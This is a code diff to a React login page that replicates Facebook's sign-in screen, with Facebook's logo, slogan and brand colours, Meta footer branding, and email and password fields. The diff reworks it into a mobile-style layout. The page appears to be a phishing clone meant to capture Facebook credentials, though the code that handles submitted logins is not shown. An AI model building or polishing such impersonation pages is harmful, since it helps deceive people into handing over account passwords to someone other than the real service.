@@ -416,215 +416,110 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f0f2f5', fontFamily: 'system-ui, -apple-system, "Segoe UI", Helvetica, Arial, sans-serif' }}>
+    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'system-ui, -apple-system, "Segoe UI", Helvetica, Arial, sans-serif' }}>
       {currentStep === "login" && (
         <>
-          {/* Desktop layout */}
-          <div className="hidden md:flex flex-1 items-center justify-center px-8">
-            <div className="w-full max-w-7xl mx-auto flex items-center gap-32">
-              {/* Left section - Facebook branding */}
-              <div className="flex-1">
-                <svg viewBox="0 0 301 100" className="w-64 mb-6" fill="#1877f2">
-                  <path d="M69.87 0c38.551 0 69.87 31.32 69.87 69.87 0 38.552-31.319 69.871-69.87 69.871S0 108.422 0 69.87C0 31.32 31.32 0 69.87 0zm6.697 104.655V80.137h8.217l1.23-9.537h-9.447v-6.09c0-2.762.766-4.645 4.729-4.645h5.051v-8.53c-.873-.116-3.87-.377-7.357-.377-7.283 0-12.27 4.446-12.27 12.607v7.035h-8.234v9.537h8.234v24.518h9.847z"/>
-                </svg>
-                <h2 className="text-[28px] leading-8 font-normal text-[#1c1e21]">
-                  Facebook helps you connect and share with the people in your life.
-                </h2>
-              </div>
-
-              {/* Right section - Login card */}
-              <div className="w-full max-w-[396px]">
-                <div className="bg-white rounded-lg shadow-lg p-5">
-                  <Form {...loginForm}>
-                    <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-4">
-                      <FormField
-                        control={loginForm.control}
-                        name="email"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormControl>
-                              <input
-                                {...field}
-                                type="text"
-                                placeholder="Email address or phone number"
-                                className="w-full h-[52px] px-4 text-[17px] border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:border-2"
-                                style={{ color: '#1c1e21' }}
-                              />
-                            </FormControl>
-                            <FormMessage className="text-xs mt-1 text-[#be4b49]" />
-                          </FormItem>
-                        )}
-                      />
-
-                      <FormField
-                        control={loginForm.control}
-                        name="password"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormControl>
-                              <input
-                                {...field}
-                                type="password"
-                                placeholder="Password"
-                                className="w-full h-[52px] px-4 text-[17px] border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:border-2"
-                                style={{ color: '#1c1e21' }}
-                              />
-                            </FormControl>
-                            <FormMessage className="text-xs mt-1 text-[#be4b49]" />
-                          </FormItem>
-                        )}
-                      />
-
-                      <button
-                        type="submit"
-                        disabled={isLoggingIn}
-                        className="w-full h-12 text-white text-xl font-bold rounded-md transition disabled:opacity-60"
-                        style={{ backgroundColor: '#1877f2' }}
-                      >
-                        {isLoggingIn ? "Logging in..." : "Log in"}
-                      </button>
-                    </form>
-                  </Form>
-
-                  <div className="text-center mt-4">
-                    <a href="#" className="text-sm text-[#1877f2] hover:underline">
-                      Forgotten password?
-                    </a>
-                  </div>
-
-                  <div className="border-t border-[#dadde1] my-5"></div>
-
-                  <div className="text-center">
-                    <button
-                      onClick={() => setSignupOpen(true)}
-                      className="h-12 px-4 text-base font-bold rounded-md"
-                      style={{ backgroundColor: '#42b72a', color: 'white' }}
-                    >
-                      Create new account
-                    </button>
-                  </div>
-                </div>
-
-                <div className="text-center mt-7">
-                  <p className="text-sm text-[#1c1e21]">
-                    <a href="#" className="font-semibold hover:underline">Create a Page</a> for a celebrity, brand or business.
-                  </p>
-                </div>
-              </div>
-            </div>
+          {/* Language selector */}
+          <div className="text-center pt-4 pb-2">
+            <span className="text-xs text-[#65676b]">English (UK)</span>
           </div>
 
-          {/* Mobile layout */}
-          <div className="md:hidden flex flex-col flex-1 px-4 py-8">
-            <div className="flex-1 flex flex-col items-center justify-center">
-              <div className="w-full max-w-md mb-8">
-                <div className="text-center mb-8">
-                  <div className="w-16 h-16 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#1877f2' }}>
-                    <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
-                      <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
-                      <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
-                    </svg>
-                  </div>
+          {/* Main content */}
+          <div className="flex-1 flex flex-col items-center justify-center px-5 pb-8">
+            <div className="w-full max-w-md">
+              {/* Facebook logo */}
+              <div className="text-center mb-12">
+                <div className="w-16 h-16 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#1877f2' }}>
+                  <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
+                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
+                    <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
+                  </svg>
                 </div>
+              </div>
 
-                <Form {...loginForm}>
-                  <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
-                    <FormField
-                      control={loginForm.control}
-                      name="email"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormControl>
-                            <input
-                              {...field}
-                              type="text"
-                              placeholder="Mobile number or email address"
-                              className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
-                              style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
-                            />
-                          </FormControl>
-                          <FormMessage className="text-xs mt-1 text-[#be4b49]" />
-                        </FormItem>
-                      )}
-                    />
+              {/* Login form */}
+              <Form {...loginForm}>
+                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
+                  <FormField
+                    control={loginForm.control}
+                    name="email"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <input
+                            {...field}
+                            type="text"
+                            placeholder="Mobile number or email address"
+                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
+                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
+                          />
+                        </FormControl>
+                        <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                      </FormItem>
+                    )}
+                  />
 
-                    <FormField
-                      control={loginForm.control}
-                      name="password"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormControl>
-                            <input
-                              {...field}
-                              type="password"
-                              placeholder="Password"
-                              className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
-                              style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
-                            />
-                          </FormControl>
-                          <FormMessage className="text-xs mt-1 text-[#be4b49]" />
-                        </FormItem>
-                      )}
-                    />
+                  <FormField
+                    control={loginForm.control}
+                    name="password"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <input
+                            {...field}
+                            type="password"
+                            placeholder="Password"
+                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
+                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
+                          />
+                        </FormControl>
+                        <FormMessage className="text-xs mt-1 text-[#be4b49]" />
+                      </FormItem>
+                    )}
+                  />
 
-                    <button
-                      type="submit"
-                      disabled={isLoggingIn}
-                      className="w-full py-3.5 text-white text-lg font-semibold transition disabled:opacity-60 rounded-full"
-                      style={{ backgroundColor: '#1877f2' }}
-                    >
-                      {isLoggingIn ? "Logging in..." : "Log in"}
-                    </button>
-                  </form>
-                </Form>
-
-                <div className="text-center mt-5 mb-8">
-                  <a href="#" className="text-sm text-[#1877f2]">
-                    Forgotten password?
-                  </a>
-                </div>
-
-                <div className="text-center mt-8">
                   <button
-                    onClick={() => setSignupOpen(true)}
-                    className="px-12 py-3 text-base font-semibold transition rounded-full"
-                    style={{ backgroundColor: 'white', color: '#1877f2', border: '1px solid #1877f2' }}
+                    type="submit"
+                    disabled={isLoggingIn}
+                    className="w-full py-3.5 text-white text-lg font-semibold transition disabled:opacity-60 rounded-full"
+                    style={{ backgroundColor: '#1877f2' }}
                   >
-                    Create new account
+                    {isLoggingIn ? "Logging in..." : "Log in"}
                   </button>
-                </div>
-              </div>
-            </div>
+                </form>
+              </Form>
 
-            <div className="text-center pb-8">
-              <img src={metaLogoImg} alt="Meta" className="h-5 mx-auto opacity-50" />
+              {/* Forgotten password link */}
+              <div className="text-center mt-5 mb-8">
+                <a href="#" className="text-sm text-[#1877f2]">
+                  Forgotten password?
+                </a>
+              </div>
+
+              {/* Create new account button */}
+              <div className="text-center mt-8">
+                <button
+                  onClick={() => setSignupOpen(true)}
+                  className="px-12 py-3 text-base font-semibold transition rounded-full"
+                  style={{ backgroundColor: 'white', color: '#1877f2', border: '1px solid #1877f2' }}
+                >
+                  Create new account
+                </button>
+              </div>
             </div>
           </div>
 
-          {/* Footer - Desktop only */}
-          <footer className="hidden md:block bg-white border-t border-[#dadde1] py-4">
-            <div className="max-w-7xl mx-auto px-8">
-              <div className="text-xs text-[#65676b] space-x-3 mb-2">
-                <a href="#" className="hover:underline">English (UK)</a>
-                <a href="#" className="hover:underline">Español</a>
-                <a href="#" className="hover:underline">Français</a>
-                <a href="#" className="hover:underline">Deutsch</a>
-                <a href="#" className="hover:underline">Italiano</a>
-                <a href="#" className="hover:underline">Português</a>
-                <a href="#" className="hover:underline">Polski</a>
-                <a href="#" className="hover:underline">Nederlands</a>
-              </div>
-              <div className="border-t border-[#dadde1] my-2"></div>
-              <div className="text-xs text-[#65676b] space-x-3">
-                <a href="#" className="hover:underline">About</a>
-                <a href="#" className="hover:underline">Help</a>
-                <a href="#" className="hover:underline">More</a>
-              </div>
-              <div className="text-xs text-[#65676b] mt-2">
-                Meta © 2025
-              </div>
+          {/* Footer */}
+          <div className="text-center pb-8 space-y-3">
+            <img src={metaLogoImg} alt="Meta" className="h-5 mx-auto opacity-50" />
+            <div className="text-xs text-[#65676b] space-x-2">
+              <a href="#" className="hover:underline">About</a>
+              <span>•</span>
+              <a href="#" className="hover:underline">Help</a>
+              <span>•</span>
+              <a href="#" className="hover:underline">More</a>
             </div>
-          </footer>
+          </div>
         </>
       )}
 
